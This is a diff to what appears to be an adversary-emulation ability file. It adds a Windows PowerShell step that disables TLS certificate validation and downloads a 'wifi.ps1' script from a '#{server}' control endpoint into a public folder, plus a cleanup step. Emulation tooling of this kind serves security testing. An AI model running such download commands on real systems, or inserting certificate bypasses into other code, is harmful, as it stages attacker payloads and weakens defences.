@@ -20,3 +20,13 @@
         chmod +x /tmp/wifi.sh
       cleanup: |
         rm /tmp/wifi.sh
+    windows:
+      command: |
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};
+        $url="#{server}/file/download";
+        $wc=New-Object System.Net.WebClient;
+        $wc.Headers.add("file","wifi.ps1");
+        $output="C:\Users\Public\wifi.ps1";
+        $wc.DownloadFile($url,$output);
+      cleanup: |
+        rm C:\Users\Public\wifi.ps1
